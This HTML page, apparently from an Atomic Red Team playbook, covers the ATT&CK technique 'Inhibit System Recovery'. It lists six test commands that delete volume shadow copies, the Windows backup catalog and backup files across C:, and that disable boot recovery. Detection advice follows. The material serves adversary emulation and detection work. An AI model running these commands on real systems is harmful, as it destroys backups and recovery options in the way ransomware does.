@@ -1,0 +1,669 @@
+
+
+<!DOCTYPE html>
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta charset="utf-8" />
+    <title>T1490 - Inhibit System Recovery &#8212; The Atomic Playbook</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css" integrity="sha384-KA6wR/X5RY4zFAHpv/CnoG2UW1uogYfdnP67Uv7eULvTveboZJg0qUpmJZb5VqzN" crossorigin="anonymous">
+    <link href="../../_static/css/index.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../_static/sphinx-book-theme.css" type="text/css" />
+    <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/togglebutton.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/copybutton.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/mystnb.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/sphinx-thebe.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/jupyter-sphinx.css" />
+    <script id="documentation_options" data-url_root="../../" src="../../_static/documentation_options.js"></script>
+    <script src="../../_static/sphinx-book-theme.js"></script>
+    <script src="../../_static/jquery.js"></script>
+    <script src="../../_static/underscore.js"></script>
+    <script src="../../_static/doctools.js"></script>
+    <script src="../../_static/language_data.js"></script>
+    <script src="../../_static/togglebutton.js"></script>
+    <script src="../../_static/clipboard.min.js"></script>
+    <script src="../../_static/copybutton.js"></script>
+    <script src="../../_static/mystnb.js"></script>
+    <script src="../../_static/sphinx-book-theme.js"></script>
+    <script >var togglebuttonSelector = '.toggle, .admonition.dropdown, .tag_hide_input div.cell_input, .tag_hide-input div.cell_input, .tag_hide_output div.cell_output, .tag_hide-output div.cell_output, .tag_hide_cell.cell, .tag_hide-cell.cell';</script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/require.js/2.3.4/require.min.js"></script>
+    <script src="https://unpkg.com/@jupyter-widgets/html-manager@^0.18.0/dist/embed-amd.js"></script>
+    <script async="async" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script async="async" src="https://unpkg.com/thebelab@latest/lib/index.js"></script>
+    <script >
+        const thebe_selector = ".thebe"
+        const thebe_selector_input = "pre"
+        const thebe_selector_output = ".output"
+    </script>
+    <script async="async" src="../../_static/sphinx-thebe.js"></script>
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <link rel="next" title="T1499.004 - Application or System Exploitation" href="T1499.004.html" />
+    <link rel="prev" title="T1489 - Service Stop" href="T1489.html" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="docsearch:language" content="en">
+
+
+
+  </head>
+  <body data-spy="scroll" data-target="#bd-toc-nav" data-offset="80">
+    
+
+    <div class="container-xl">
+      <div class="row">
+          
+<div class="col-12 col-md-3 bd-sidebar site-navigation show" id="site-navigation">
+    
+        <div class="navbar-brand-box">
+<a class="navbar-brand text-wrap" href="../../index.html">
+  
+  <img src="../../_static/logo.png" class="logo" alt="logo">
+  
+  
+  <h1 class="site-logo" id="site-title">The Atomic Playbook</h1>
+  
+</a>
+</div>
+
+<form class="bd-search d-flex align-items-center" action="../../search.html" method="get">
+  <i class="icon fas fa-search"></i>
+  <input type="search" class="form-control" name="q" id="search-input" placeholder="Search this book..." aria-label="Search this book..." autocomplete="off" >
+</form>
+
+<nav class="bd-links" id="bd-docs-nav" aria-label="Main navigation">
+  <ul class="nav sidenav_l1">
+ <li class="toctree-l1">
+  <a class="reference internal" href="../../intro.html">
+   Welcome to the Atomic Playbook
+  </a>
+ </li>
+</ul>
+<ul class="current nav sidenav_l1">
+ <li class="toctree-l1">
+  <a class="reference internal" href="../initial-access.html">
+   Initial Access
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../execution.html">
+   Execution
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../persistence.html">
+   Persistence
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../privilege-escalation.html">
+   Privilege Escalation
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../defense-evasion.html">
+   Defense Evasion
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../credential-access.html">
+   Credential Access
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../discovery.html">
+   Discovery
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../lateral-movement.html">
+   Lateral Movement
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../collection.html">
+   Collection
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../command-and-control.html">
+   Command and Control
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../exfiltration.html">
+   Exfiltration
+  </a>
+ </li>
+ <li class="toctree-l1 current active">
+  <a class="reference internal" href="../impact.html">
+   Impact
+  </a>
+  <ul class="current">
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1561.html">
+     T1561 - Disk Wipe
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1498.html">
+     T1498 - Network Denial of Service
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1565.003.html">
+     T1565.003 - Runtime Data Manipulation
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1565.001.html">
+     T1565.001 - Stored Data Manipulation
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1491.002.html">
+     T1491.002 - External Defacement
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1565.html">
+     T1565 - Data Manipulation
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1485.html">
+     T1485 - Data Destruction
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1491.001.html">
+     T1491.001 - Internal Defacement
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1565.002.html">
+     T1565.002 - Transmitted Data Manipulation
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1499.html">
+     T1499 - Endpoint Denial of Service
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1486.html">
+     T1486 - Data Encrypted for Impact
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1491.html">
+     T1491 - Defacement
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1495.html">
+     T1495 - Firmware Corruption
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1499.001.html">
+     T1499.001 - OS Exhaustion Flood
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1529.html">
+     T1529 - System Shutdown/Reboot
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1498.002.html">
+     T1498.002 - Reflection Amplification
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1561.001.html">
+     T1561.001 - Disk Content Wipe
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1499.003.html">
+     T1499.003 - Application Exhaustion Flood
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1489.html">
+     T1489 - Service Stop
+    </a>
+   </li>
+   <li class="toctree-l2 current active">
+    <a class="current reference internal" href="#">
+     T1490 - Inhibit System Recovery
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1499.004.html">
+     T1499.004 - Application or System Exploitation
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1498.001.html">
+     T1498.001 - Direct Network Flood
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1499.002.html">
+     T1499.002 - Service Exhaustion Flood
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1496.html">
+     T1496 - Resource Hijacking
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1531.html">
+     T1531 - Account Access Removal
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1561.002.html">
+     T1561.002 - Disk Structure Wipe
+    </a>
+   </li>
+  </ul>
+ </li>
+</ul>
+
+</nav>
+
+ <!-- To handle the deprecated key -->
+
+<div class="navbar_extra_footer">
+  Powered by <a href="https://jupyterbook.org">Jupyter Book</a>
+</div>
+
+</div>
+
+
+          
+
+
+          
+<main class="col py-md-3 pl-md-4 bd-content overflow-auto" role="main">
+    
+    <div class="row topbar fixed-top container-xl">
+    <div class="col-12 col-md-3 bd-topbar-whitespace site-navigation show">
+    </div>
+    <div class="col pl-2 topbar-main">
+        
+        <button id="navbar-toggler" class="navbar-toggler ml-0" type="button" data-toggle="collapse"
+            data-toggle="tooltip" data-placement="bottom" data-target=".site-navigation" aria-controls="navbar-menu"
+            aria-expanded="true" aria-label="Toggle navigation" aria-controls="site-navigation"
+            title="Toggle navigation" data-toggle="tooltip" data-placement="left">
+            <i class="fas fa-bars"></i>
+            <i class="fas fa-arrow-left"></i>
+            <i class="fas fa-arrow-up"></i>
+        </button>
+        
+        <div class="dropdown-buttons-trigger">
+    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn" aria-label="Download this page"><i
+            class="fas fa-download"></i></button>
+
+    
+    <div class="dropdown-buttons">
+        <!-- ipynb file if we had a myst markdown file -->
+        
+        <!-- Download raw file -->
+        <a class="dropdown-buttons" href="../../_sources/tactics/impact/T1490.ipynb"><button type="button"
+                class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip"
+                data-placement="left">.ipynb</button></a>
+        <!-- Download PDF via print -->
+        <button type="button" id="download-print" class="btn btn-secondary topbarbtn" title="Print to PDF"
+            onClick="window.print()" data-toggle="tooltip" data-placement="left">.pdf</button>
+    </div>
+    
+</div>
+        <!-- Source interaction buttons -->
+
+
+        <!-- Full screen (wrap in <a> to have style consistency -->
+        <a class="full-screen-button"><button type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip"
+                data-placement="bottom" onclick="toggleFullScreen()" title="Fullscreen mode"><i
+                    class="fas fa-expand"></i></button></a>
+
+        <!-- Launch buttons -->
+
+    </div>
+
+    <!-- Table of contents -->
+    <div class="d-none d-md-block col-md-2 bd-toc show">
+        <div class="tocsection onthispage pt-5 pb-3">
+            <i class="fas fa-list"></i> Contents
+        </div>
+        <nav id="bd-toc-nav">
+            <ul class="nav section-nav flex-column">
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#atomic-tests">
+   Atomic Tests
+  </a>
+  <ul class="nav section-nav flex-column">
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-1-windows-delete-volume-shadow-copies">
+     Atomic Test #1 - Windows - Delete Volume Shadow Copies
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#attack-commands-run-with-command-prompt">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         command_prompt
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-2-windows-delete-volume-shadow-copies-via-wmi">
+     Atomic Test #2 - Windows - Delete Volume Shadow Copies via WMI
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id1">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         command_prompt
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-3-windows-delete-windows-backup-catalog">
+     Atomic Test #3 - Windows - Delete Windows Backup Catalog
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id2">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         command_prompt
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-4-windows-disable-windows-recovery-console-repair">
+     Atomic Test #4 - Windows - Disable Windows Recovery Console Repair
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id3">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         command_prompt
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-5-windows-delete-volume-shadow-copies-via-wmi-with-powershell">
+     Atomic Test #5 - Windows - Delete Volume Shadow Copies via WMI with PowerShell
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#attack-commands-run-with-powershell">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-6-windows-delete-backup-files">
+     Atomic Test #6 - Windows - Delete Backup Files
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id4">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         command_prompt
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#detection">
+   Detection
+  </a>
+ </li>
+</ul>
+
+        </nav>
+    </div>
+</div>
+    <div id="main-content" class="row">
+        <div class="col-12 col-md-9 pl-md-3 pr-md-0">
+        
+              <div>
+                
+  <div class="section" id="t1490-inhibit-system-recovery">
+<h1>T1490 - Inhibit System Recovery<a class="headerlink" href="#t1490-inhibit-system-recovery" title="Permalink to this headline">¶</a></h1>
+<p>Adversaries may delete or remove built-in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of <a class="reference external" href="https://attack.mitre.org/techniques/T1485">Data Destruction</a> and <a class="reference external" href="https://attack.mitre.org/techniques/T1486">Data Encrypted for Impact</a>.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017)</p>
+<p>A number of native Windows utilities have been used by adversaries to disable or delete system recovery features:</p>
+<ul class="simple">
+<li><p><code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code></p></li>
+<li><p><a class="reference external" href="https://attack.mitre.org/techniques/T1047">Windows Management Instrumentation</a> can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code></p></li>
+<li><p><code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code></p></li>
+<li><p><code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures &amp; bcdedit /set {default} recoveryenabled no</code></p></li>
+</ul>
+<div class="section" id="atomic-tests">
+<h2>Atomic Tests<a class="headerlink" href="#atomic-tests" title="Permalink to this headline">¶</a></h2>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#Import the Module before running the tests.</span>
+<span class="n">Import</span><span class="o">-</span><span class="n">Module</span> <span class="o">/</span><span class="n">Users</span><span class="o">/</span><span class="mh">0x6c</span><span class="o">/</span><span class="n">AtomicRedTeam</span><span class="o">/</span><span class="n">atomics</span><span class="o">/</span><span class="n">invoke</span><span class="o">-</span><span class="n">atomicredteam</span><span class="o">/</span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicRedTeam</span><span class="o">.</span><span class="n">psd1</span> <span class="o">-</span> <span class="n">Force</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-1-windows-delete-volume-shadow-copies">
+<h3>Atomic Test #1 - Windows - Delete Volume Shadow Copies<a class="headerlink" href="#atomic-test-1-windows-delete-volume-shadow-copies" title="Permalink to this headline">¶</a></h3>
+<p>Deletes Windows Volume Shadow Copies. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon
+execution, if no shadow volumes exist the message “No items found that satisfy the query.” will be displayed. If shadow volumes are present, it
+will delete them without printing output to the screen. This is because the /quiet parameter was passed which also suppresses the y/n
+confirmation prompt. Shadow copies can only be created on Windows server or Windows 8.</p>
+<p>https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc788055(v=ws.11)</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="attack-commands-run-with-command-prompt">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#attack-commands-run-with-command-prompt" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>vssadmin.exe delete shadows /all /quiet
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1490</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">1</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-2-windows-delete-volume-shadow-copies-via-wmi">
+<h3>Atomic Test #2 - Windows - Delete Volume Shadow Copies via WMI<a class="headerlink" href="#atomic-test-2-windows-delete-volume-shadow-copies-via-wmi" title="Permalink to this headline">¶</a></h3>
+<p>Deletes Windows Volume Shadow Copies via WMI. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.
+Shadow copies can only be created on Windows server or Windows 8.</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="id1">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>wmic.exe shadowcopy delete
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1490</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">2</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-3-windows-delete-windows-backup-catalog">
+<h3>Atomic Test #3 - Windows - Delete Windows Backup Catalog<a class="headerlink" href="#atomic-test-3-windows-delete-windows-backup-catalog" title="Permalink to this headline">¶</a></h3>
+<p>Deletes Windows Backup Catalog. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon execution,
+“The backup catalog has been successfully deleted.” will be displayed in the PowerShell session.</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="id2">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>wbadmin.exe delete catalog -quiet
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1490</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">3</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-4-windows-disable-windows-recovery-console-repair">
+<h3>Atomic Test #4 - Windows - Disable Windows Recovery Console Repair<a class="headerlink" href="#atomic-test-4-windows-disable-windows-recovery-console-repair" title="Permalink to this headline">¶</a></h3>
+<p>Disables repair by the Windows Recovery Console on boot. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.
+Upon execution, “The operation completed successfully.” will be displayed in the powershell session.</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="id3">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
+bcdedit.exe /set {default} recoveryenabled no
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1490</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">4</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-5-windows-delete-volume-shadow-copies-via-wmi-with-powershell">
+<h3>Atomic Test #5 - Windows - Delete Volume Shadow Copies via WMI with PowerShell<a class="headerlink" href="#atomic-test-5-windows-delete-volume-shadow-copies-via-wmi-with-powershell" title="Permalink to this headline">¶</a></h3>
+<p>Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject.
+This technique is used by numerous ransomware families such as Sodinokibi/REvil.
+Executes Get-WMIObject. Shadow copies can only be created on Windows server or Windows 8, so upon execution
+there may be no output displayed.</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="attack-commands-run-with-powershell">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Get-WmiObject</span> <span class="n">Win32_Shadowcopy</span> <span class="p">|</span> <span class="k">ForEach</span><span class="n">-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Delete</span><span class="p">();}</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1490</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">5</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-6-windows-delete-backup-files">
+<h3>Atomic Test #6 - Windows - Delete Backup Files<a class="headerlink" href="#atomic-test-6-windows-delete-backup-files" title="Permalink to this headline">¶</a></h3>
+<p>Deletes backup files in a manner similar to Ryuk ransomware. Upon exection, many “access is denied” messages will appear as the commands try
+to delete files from around the system.</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="id4">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1490</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">6</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="detection">
+<h2>Detection<a class="headerlink" href="#detection" title="Permalink to this headline">¶</a></h2>
+<p>Use process monitoring to monitor the execution and command line parameters of binaries involved in inhibiting system recovery, such as vssadmin, wbadmin, and bcdedit. The Windows event logs, ex. Event ID 524 indicating a system catalog was deleted, may contain entries associated with suspicious activity.</p>
+<p>Monitor the status of services involved in system recovery. Monitor the registry for changes associated with system recovery features (ex: the creation of <code>HKEY_CURRENT_USER\Software\Policies\Microsoft\PreviousVersions\DisableLocalPage</code>).</p>
+</div>
+</div>
+
+    <script type="text/x-thebe-config">
+    {
+        requestKernel: true,
+        binderOptions: {
+            repo: "binder-examples/jupyter-stacks-datascience",
+            ref: "master",
+        },
+        codeMirrorConfig: {
+            theme: "abcdef",
+            mode: ".net-powershell"
+        },
+        kernelOptions: {
+            kernelName: ".net-powershell",
+            path: "./tactics/impact"
+        },
+        predefinedOutput: true
+    }
+    </script>
+    <script>kernelName = '.net-powershell'</script>
+
+              </div>
+              
+        </div>
+    </div>
+    
+    
+    <div class='prev-next-bottom'>
+        
+    <a class='left-prev' id="prev-link" href="T1489.html" title="previous page">T1489 - Service Stop</a>
+    <a class='right-next' id="next-link" href="T1499.004.html" title="next page">T1499.004 - Application or System Exploitation</a>
+
+    </div>
+    <footer class="footer mt-5 mt-md-0">
+    <div class="container">
+      <p>
+        
+          By Hare Sudhan Muthusamy<br/>
+        
+            &copy; Copyright 2020.<br/>
+      </p>
+    </div>
+  </footer>
+</main>
+
+
+      </div>
+    </div>
+
+    <script src="../../_static/js/index.js"></script>
+    
+  </body>
+</html>
